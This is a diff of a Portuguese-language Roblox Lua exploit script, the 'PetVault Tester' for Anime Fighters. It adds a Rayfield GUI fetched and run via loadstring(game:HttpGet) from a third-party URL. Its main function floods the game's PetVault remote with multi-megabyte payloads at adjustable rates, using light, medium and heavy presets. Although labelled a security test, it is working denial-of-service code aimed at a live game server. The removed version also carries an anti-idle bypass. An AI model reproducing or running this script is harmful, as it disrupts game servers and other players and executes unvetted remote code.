@@ -1,203 +1,307 @@
 -- =====================================================
--- TESTE DE CARGA NO PETVAULT - VERSÃO AUTÔNOMA
-// Use APENAS na cópia do jogo para testes de segurança
+-- PETVAULT TESTER - RAYFIELD EDITION
+// Carregue com: loadstring(game:HttpGet("SEU_LINK_AQUI"))()
 -- =====================================================
 
--- Carregar serviços
+-- Carregar Rayfield
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua'))()
+
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
-local UserInputService = game:GetService("UserInputService")
 local Player = Players.LocalPlayer
 
 -- ========== CONFIGURAÇÕES ==========
-local TEST_CONFIG = {
+local CONFIG = {
+    remoteName = "PetVault",
+    pastaRemote = "Remote",
     intensidade = {
-        payloadKB = 500,          -- Tamanho do payload (500KB)
-        chamadasPorSegundo = 3,    -- Chamadas por segundo
-        duracaoSegundos = 20,      -- Duração do teste
+        payloadKB = 1000,
+        chamadasPorSegundo = 3,
+        duracaoSegundos = 20
     },
-    modoTeste = {
-        nome = "original",
-        descricao = "Cópia do exploit (4.2M caracteres)"
+    stats = {
+        chamadas = 0,
+        sucessos = 0,
+        falhas = 0,
+        inicio = 0
     }
 }
 
--- ========== UI SIMPLES (caso o modelo não carregue) ==========
-local function criarUI()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "PetVaultTester"
-    screenGui.Parent = Player:WaitForChild("PlayerGui")
+-- ========== JANELA PRINCIPAL ==========
+local Window = Rayfield:CreateWindow({
+    Name = "PetVault Tester - Anime Fighters",
+    LoadingTitle = "Carregando...",
+    LoadingSubtitle = "by Equipe de Testes",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "PetVaultTest",
+        FileName = "Config"
+    },
+    Discord = {
+        Enabled = false
+    },
+    KeySystem = false
+})
 
-    local frame = Instance.new("Frame")
-    frame.Parent = screenGui
-    frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
-    frame.Size = UDim2.new(0, 350, 0, 250)
-    frame.Position = UDim2.new(0.5, -175, 0.5, -125)
-    frame.Active = true
-    frame.Draggable = true
+-- ========== ABA PRINCIPAL ==========
+local MainTab = Window:CreateTab("Testes", 4483362458)
 
-    local title = Instance.new("TextLabel")
-    title.Parent = frame
-    title.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-    title.Size = UDim2.new(1, 0, 0, 30)
-    title.Text = "PetVault Tester"
-    title.TextColor3 = Color3.new(0, 1, 0)
-    title.Font = Enum.Font.GothamBold
-    title.TextScaled = true
+-- ========== SEÇÃO DE CONTROLE ==========
+local ControlSection = MainTab:CreateSection("Controles do Teste")
 
-    local status = Instance.new("TextLabel")
-    status.Parent = frame
-    status.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
-    status.Size = UDim2.new(1, -10, 0, 30)
-    status.Position = UDim2.new(0, 5, 0, 35)
-    status.Text = "Status: Pronto"
-    status.TextColor3 = Color3.new(1, 1, 1)
-    status.TextXAlignment = Enum.TextXAlignment.Left
+-- Status em tempo real
+local StatusLabel = MainTab:CreateLabel("Status: <font color='#ffaa00'>Pronto</font>")
 
-    -- Botão Teste
-    local btnTestar = Instance.new("TextButton")
-    btnTestar.Parent = frame
-    btnTestar.BackgroundColor3 = Color3.new(0.3, 0.6, 1)
-    btnTestar.Size = UDim2.new(0.9, 0, 0, 40)
-    btnTestar.Position = UDim2.new(0.05, 0, 0.3, 0)
-    btnTestar.Text = "INICIAR TESTE"
-    btnTestar.Font = Enum.Font.GothamBold
-    btnTestar.TextScaled = true
+-- Botão TESTAR PETVAULT
+local TestButton = MainTab:CreateButton({
+    Name = "🔍 TESTAR PETVAULT",
+    Callback = function()
+        coroutine.wrap(testarPetVault)()
+    end
+})
 
-    -- Botão Modo Leve
-    local btnLeve = Instance.new("TextButton")
-    btnLeve.Parent = frame
-    btnLeve.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
-    btnLeve.Size = UDim2.new(0.4, 0, 0, 35)
-    btnLeve.Position = UDim2.new(0.05, 0, 0.5, 0)
-    btnLeve.Text = "Leve"
-    btnLeve.Font = Enum.Font.Gotham
+-- Botão REJOIN
+MainTab:CreateButton({
+    Name = "♻️ REJOIN",
+    Callback = function()
+        local delay = CONFIG.intensidade.duracaoSegundos or 3
+        StatusLabel:Set("Status: <font color='#ffaa00'>Rejoin em " .. delay .. "s</font>")
+        wait(delay)
+        game:GetService("TeleportService"):Teleport(game.PlaceId, Player)
+    end
+})
 
-    -- Botão Modo Original
-    local btnOriginal = Instance.new("TextButton")
-    btnOriginal.Parent = frame
-    btnOriginal.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
-    btnOriginal.Size = UDim2.new(0.4, 0, 0, 35)
-    btnOriginal.Position = UDim2.new(0.55, 0, 0.5, 0)
-    btnOriginal.Text = "Original"
-    btnOriginal.Font = Enum.Font.Gotham
+-- ========== SEÇÃO DE CONFIGURAÇÃO ==========
+local ConfigSection = MainTab:CreateSection("Configurações do Teste")
 
-    -- Botão Rejoin
-    local btnRejoin = Instance.new("TextButton")
-    btnRejoin.Parent = frame
-    btnRejoin.BackgroundColor3 = Color3.new(0.8, 0.6, 0.2)
-    btnRejoin.Size = UDim2.new(0.9, 0, 0, 35)
-    btnRejoin.Position = UDim2.new(0.05, 0, 0.7, 0)
-    btnRejoin.Text = "REJOIN"
-    btnRejoin.Font = Enum.Font.GothamBold
+-- Input para nome do remote
+local RemoteInput = MainTab:CreateInput({
+    Name = "Nome do Remote",
+    CurrentValue = "PetVault",
+    PlaceholderText = "Digite o nome do remote",
+    Callback = function(Value)
+        CONFIG.remoteName = Value
+    end
+})
 
-    return {
-        status = status,
-        btnTestar = btnTestar,
-        btnLeve = btnLeve,
-        btnOriginal = btnOriginal,
-        btnRejoin = btnRejoin
-    }
-end
+-- Input para pasta
+local PastaInput = MainTab:CreateInput({
+    Name = "Pasta do Remote",
+    CurrentValue = "Remote",
+    PlaceholderText = "Digite a pasta (ex: Remote)",
+    Callback = function(Value)
+        CONFIG.pastaRemote = Value
+    end
+})
 
--- ========== FUNÇÕES DE TESTE ==========
+-- Slider para payload (KB)
+local PayloadSlider = MainTab:CreateSlider({
+    Name = "Tamanho do Payload (KB)",
+    Range = {10, 10000},
+    Increment = 10,
+    CurrentValue = 1000,
+    Flag = "PayloadSize",
+    Callback = function(Value)
+        CONFIG.intensidade.payloadKB = Value
+    end
+})
 
--- Obtém o menor pet (adaptado do script original)
-function getLowestPet()
-    local success, data = pcall(function()
-        return require(ReplicatedStorage.ModuleScripts.LocalDairebStore).GetStoreProxy("GameData"):GetData("Pets")
-    end)
-    if success and data then
-        for _, pet in pairs(data) do
-            if not pet.Locked then
-                return pet.UID
-            end
+-- Slider para chamadas por segundo
+local CallsSlider = MainTab:CreateSlider({
+    Name = "Chamadas por segundo",
+    Range = {1, 20},
+    Increment = 1,
+    CurrentValue = 3,
+    Flag = "CallsPerSecond",
+    Callback = function(Value)
+        CONFIG.intensidade.chamadasPorSegundo = Value
+    end
+})
+
+-- Slider para duração
+local DurationSlider = MainTab:CreateSlider({
+    Name = "Duração (segundos)",
+    Range = {5, 120},
+    Increment = 5,
+    CurrentValue = 20,
+    Flag = "Duration",
+    Callback = function(Value)
+        CONFIG.intensidade.duracaoSegundos = Value
+    end
+})
+
+-- ========== SEÇÃO DE PRESETS ==========
+local PresetSection = MainTab:CreateSection("Modos de Teste")
+
+-- Botão MODO LEVE
+MainTab:CreateButton({
+    Name = "🟢 MODO LEVE (100KB, 2 chamadas/s)",
+    Callback = function()
+        CONFIG.intensidade.payloadKB = 100
+        CONFIG.intensidade.chamadasPorSegundo = 2
+        CONFIG.intensidade.duracaoSegundos = 15
+        PayloadSlider:Set(100)
+        CallsSlider:Set(2)
+        DurationSlider:Set(15)
+        StatusLabel:Set("Status: <font color='#00ff00'>Modo LEVE ativado</font>")
+    end
+})
+
+-- Botão MODO MÉDIO
+MainTab:CreateButton({
+    Name = "🟡 MODO MÉDIO (1000KB, 5 chamadas/s)",
+    Callback = function()
+        CONFIG.intensidade.payloadKB = 1000
+        CONFIG.intensidade.chamadasPorSegundo = 5
+        CONFIG.intensidade.duracaoSegundos = 30
+        PayloadSlider:Set(1000)
+        CallsSlider:Set(5)
+        DurationSlider:Set(30)
+        StatusLabel:Set("Status: <font color='#ffff00'>Modo MÉDIO ativado</font>")
+    end
+})
+
+-- Botão MODO PESADO
+MainTab:CreateButton({
+    Name = "🔴 MODO PESADO (5000KB, 10 chamadas/s)",
+    Callback = function()
+        CONFIG.intensidade.payloadKB = 5000
+        CONFIG.intensidade.chamadasPorSegundo = 10
+        CONFIG.intensidade.duracaoSegundos = 45
+        PayloadSlider:Set(5000)
+        CallsSlider:Set(10)
+        DurationSlider:Set(45)
+        StatusLabel:Set("Status: <font color='#ff0000'>Modo PESADO ativado</font>")
+    end
+})
+
+-- ========== SEÇÃO DE LOGS ==========
+local LogSection = MainTab:CreateSection("Resultados")
+
+local LogDisplay = MainTab:CreateParagraph({
+    Title = "Log do Teste",
+    Content = "Clique em TESTAR PETVAULT para começar."
+})
+
+-- ========== FUNÇÃO PRINCIPAL DE TESTE ==========
+function testarPetVault()
+    -- Reset stats
+    CONFIG.stats.chamadas = 0
+    CONFIG.stats.sucessos = 0
+    CONFIG.stats.falhas = 0
+    CONFIG.stats.inicio = os.clock()
+    
+    StatusLabel:Set("Status: <font color='#ffaa00'>Testando...</font>")
+    LogDisplay:Set("🔍 Iniciando teste do PetVault...\n")
+    
+    -- Localizar o remote
+    local remote = ReplicatedStorage
+    if CONFIG.pastaRemote ~= "" then
+        remote = remote:FindFirstChild(CONFIG.pastaRemote)
+        if not remote then
+            local erro = "❌ Pasta '" .. CONFIG.pastaRemote .. "' não encontrada!"
+            LogDisplay:Set(erro)
+            StatusLabel:Set("Status: <font color='#ff0000'>Erro: Pasta não encontrada</font>")
+            return
         end
     end
-    return "UID_TESTE_123"
-end
-
--- Gera payload
-function gerarPayload(tamanhoKB)
-    return string.rep("9", tamanhoKB * 1024)
-end
-
--- Função de teste principal
-function testarPetVault(modo)
-    local remote = ReplicatedStorage:FindFirstChild("Remote") and ReplicatedStorage.Remote:FindFirstChild("PetVault")
+    
+    remote = remote:FindFirstChild(CONFIG.remoteName)
     if not remote then
-        ui.status.Text = "Status: PetVault não encontrado!"
+        local erro = "❌ Remote '" .. CONFIG.remoteName .. "' não encontrado!"
+        LogDisplay:Set(erro)
+        StatusLabel:Set("Status: <font color='#ff0000'>Erro: Remote não encontrado</font>")
         return
     end
-
-    local payload = gerarPayload(TEST_CONFIG.intensidade.payloadKB)
-    local totalChamadas = TEST_CONFIG.intensidade.duracaoSegundos * TEST_CONFIG.intensidade.chamadasPorSegundo
-    local stats = { chamadas = 0, sucessos = 0, falhas = 0, inicio = os.clock() }
-
-    ui.status.Text = "Status: Testando..."
+    
+    local sucessoInicial = "✅ Remote encontrado: " .. remote:GetFullName()
+    LogDisplay:Set(LogDisplay.Content .. "\n" .. sucessoInicial)
+    
+    -- Preparar payload
+    local payload = string.rep("9", CONFIG.intensidade.payloadKB * 1024)
+    local totalChamadas = CONFIG.intensidade.duracaoSegundos * CONFIG.intensidade.chamadasPorSegundo
+    
+    LogDisplay:Set(LogDisplay.Content .. string.format("\n📊 Configuração:\n- Payload: %dKB\n- Chamadas/s: %d\n- Duração: %ds\n- Total chamadas: %d\n", 
+        CONFIG.intensidade.payloadKB,
+        CONFIG.intensidade.chamadasPorSegundo,
+        CONFIG.intensidade.duracaoSegundos,
+        totalChamadas))
+    
+    -- Loop de teste
     for i = 1, totalChamadas do
-        stats.chamadas = stats.chamadas + 1
-        local ok = pcall(function()
-            local petUID = getLowestPet()
+        CONFIG.stats.chamadas = CONFIG.stats.chamadas + 1
+        
+        local sucesso, erro = pcall(function()
+            -- Tenta encontrar um pet real, se falhar usa UID genérico
+            local petUID = "UID_TESTE_123"
+            pcall(function()
+                local store = require(game.ReplicatedStorage.ModuleScripts.LocalDairebStore)
+                if store then
+                    local data = store.GetStoreProxy("GameData"):GetData("Pets")
+                    for _, pet in pairs(data) do
+                        if not pet.Locked then
+                            petUID = pet.UID
+                            break
+                        end
+                    end
+                end
+            end)
+            
             remote:FireServer(petUID, true, payload)
         end)
-        if ok then
-            stats.sucessos = stats.sucessos + 1
+        
+        if sucesso then
+            CONFIG.stats.sucessos = CONFIG.stats.sucessos + 1
         else
-            stats.falhas = stats.falhas + 1
+            CONFIG.stats.falhas = CONFIG.stats.falhas + 1
         end
-        if i % math.floor(totalChamadas/5) == 0 then
-            local perc = math.floor(i/totalChamadas*100)
-            ui.status.Text = "Status: " .. perc .. "%"
+        
+        -- Atualizar status a cada 10%
+        if i % math.floor(totalChamadas/10) == 0 then
+            local percentual = math.floor((i/totalChamadas)*100)
+            StatusLabel:Set(string.format("Status: <font color='#ffaa00'>Testando... %d%%</font>", percentual))
         end
-        wait(1 / TEST_CONFIG.intensidade.chamadasPorSegundo)
+        
+        wait(1 / CONFIG.intensidade.chamadasPorSegundo)
     end
-
-    local elapsed = os.clock() - stats.inicio
-    local relatorio = string.format("Concluído! Chamadas: %d, Sucessos: %d, Falhas: %d", stats.chamadas, stats.sucessos, stats.falhas)
-    ui.status.Text = relatorio
-    print(relatorio)
-    if stats.falhas == 0 then
-        warn("⚠️ VULNERABILIDADE: Todas as chamadas foram aceitas!")
+    
+    -- Gerar relatório
+    local elapsed = os.clock() - CONFIG.stats.inicio
+    local relatorio = string.format("\n📊 RELATÓRIO FINAL\n━━━━━━━━━━━━━━━━━━\n" ..
+        "Duração real: %.1fs\n" ..
+        "Chamadas totais: %d\n" ..
+        "✅ Sucessos: %d\n" ..
+        "❌ Falhas: %d\n" ..
+        "Taxa média: %.1f chamadas/s\n\n", 
+        elapsed,
+        CONFIG.stats.chamadas,
+        CONFIG.stats.sucessos,
+        CONFIG.stats.falhas,
+        CONFIG.stats.chamadas / elapsed)
+    
+    -- Análise
+    if CONFIG.stats.falhas > 0 then
+        relatorio = relatorio .. "🛡️ O servidor REJEITOU " .. CONFIG.stats.falhas .. " chamadas!\n"
+        if CONFIG.stats.falhas == CONFIG.stats.chamadas then
+            relatorio = relatorio .. "✅ PROTEÇÃO TOTAL - Todas as chamadas foram bloqueadas!"
+        else
+            relatorio = relatorio .. "⚠️ PROTEÇÃO PARCIAL - Algumas chamadas passaram."
+        end
     else
-        print("✅ Proteção ativa: servidor rejeitou " .. stats.falhas .. " chamadas.")
+        relatorio = relatorio .. "❌ VULNERABILIDADE DETECTADA!\n"
+        relatorio = relatorio .. "Todas as " .. CONFIG.stats.chamadas .. " chamadas foram aceitas.\n"
+        relatorio = relatorio .. "O servidor NÃO está rejeitando dados grandes!"
     end
+    
+    LogDisplay:Set(LogDisplay.Content .. "\n" .. relatorio)
+    StatusLabel:Set("Status: <font color='#00ff00'>Teste concluído</font>")
 end
 
--- ========== CONECTAR UI ==========
-local ui = criarUI()
+-- ========== NOTIFICAÇÃO INICIAL ==========
+Rayfield:Notify({
+    Title = "PetVault Tester",
+    Content = "Script carregado! Ajuste as configurações e teste.",
+    Duration = 3
+})
 
-ui.btnTestar.MouseButton1Click:Connect(function()
-    testarPetVault()
-end)
-
-ui.btnLeve.MouseButton1Click:Connect(function()
-    TEST_CONFIG.intensidade.payloadKB = 100
-    TEST_CONFIG.intensidade.chamadasPorSegundo = 2
-    TEST_CONFIG.intensidade.duracaoSegundos = 10
-    ui.status.Text = "Status: Modo Leve ativado"
-end)
-
-ui.btnOriginal.MouseButton1Click:Connect(function()
-    TEST_CONFIG.intensidade.payloadKB = 4200  -- 4.2M caracteres
-    TEST_CONFIG.intensidade.chamadasPorSegundo = 1
-    TEST_CONFIG.intensidade.duracaoSegundos = 5
-    ui.status.Text = "Status: Modo Original ativado"
-end)
-
-ui.btnRejoin.MouseButton1Click:Connect(function()
-    ui.status.Text = "Status: Rejoin em 3s..."
-    wait(3)
-    TeleportService:Teleport(game.PlaceId, Player)
-end)
-
--- Prevenção de idle
-local VirtualUser = game:GetService("VirtualUser")
-Player.Idled:connect(function()
-    VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-    wait(1)
-    VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-end)
-
-print("✅ Script carregado! Use a interface para testar.")
+print("✅ PetVault Tester Rayfield carregado com sucesso!")
